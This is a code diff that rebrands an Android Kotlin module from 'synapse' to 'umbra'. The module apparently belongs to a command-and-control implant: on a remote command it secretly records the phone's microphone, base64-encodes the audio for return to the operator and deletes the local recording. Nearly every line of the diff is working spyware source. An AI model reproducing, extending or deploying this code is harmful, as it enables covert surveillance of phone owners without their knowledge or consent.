@@ -1,10 +1,10 @@
-package org.synapse.core.modules
+package org.umbra.core.modules
 
 import android.content.Context
 import android.media.MediaRecorder
 import android.util.Base64
-import org.synapse.core.c2.Command
-import org.synapse.core.core.SynapseResponse
+import org.umbra.core.c2.Command
+import org.umbra.core.core.UmbraResponse
 import java.io.File
 import java.io.FileInputStream
 import kotlinx.coroutines.*
@@ -15,15 +15,15 @@ object MicModule {
     private var recordingFile: File? = null
     private var isRecording = false
 
-    suspend fun record(context: Context, cmd: Command): SynapseResponse {
+    suspend fun record(context: Context, cmd: Command): UmbraResponse {
         if (isRecording) {
-            return SynapseResponse.ErrorResponse("mic:already_recording", "mic")
+            return UmbraResponse.ErrorResponse("mic:already_recording", "mic")
         }
 
         val durationSec = (cmd.params["duration"]?.toIntOrNull() ?: 30).coerceIn(5, 300)
 
         return try {
-            val file = File(context.cacheDir, "synapse_mic_${System.currentTimeMillis()}.aac")
+            val file = File(context.cacheDir, "umbra_mic_${System.currentTimeMillis()}.aac")
             recordingFile = file
 
             val rec = MediaRecorder().apply {
@@ -47,21 +47,21 @@ object MicModule {
             stopInternal()
         } catch (e: SecurityException) {
             cleanup()
-            SynapseResponse.ErrorResponse("mic:permission_denied:${e.message}", "mic")
+            UmbraResponse.ErrorResponse("mic:permission_denied:${e.message}", "mic")
         } catch (e: Exception) {
             cleanup()
-            SynapseResponse.ErrorResponse("mic:${e.message}", "mic")
+            UmbraResponse.ErrorResponse("mic:${e.message}", "mic")
         }
     }
 
-    suspend fun stop(context: Context, cmd: Command): SynapseResponse {
+    suspend fun stop(context: Context, cmd: Command): UmbraResponse {
         if (!isRecording) {
-            return SynapseResponse.ErrorResponse("mic:not_recording", "mic")
+            return UmbraResponse.ErrorResponse("mic:not_recording", "mic")
         }
         return stopInternal()
     }
 
-    private suspend fun stopInternal(): SynapseResponse {
+    private suspend fun stopInternal(): UmbraResponse {
         return try {
             val rec = recorder
             val file = recordingFile
@@ -80,18 +80,18 @@ object MicModule {
                 file.delete()
                 recordingFile = null
 
-                SynapseResponse.MicRecordingResponse(
+                UmbraResponse.MicRecordingResponse(
                     audio_base64 = b64,
                     duration_seconds = 0,
                     format = "AAC",
                     size_bytes = bytes.size.toLong()
                 )
             } else {
-                SynapseResponse.ErrorResponse("mic:empty_recording", "mic")
+                UmbraResponse.ErrorResponse("mic:empty_recording", "mic")
             }
         } catch (e: Exception) {
             cleanup()
-            SynapseResponse.ErrorResponse("mic:stop_failed:${e.message}", "mic")
+            UmbraResponse.ErrorResponse("mic:stop_failed:${e.message}", "mic")
         }
     }
 
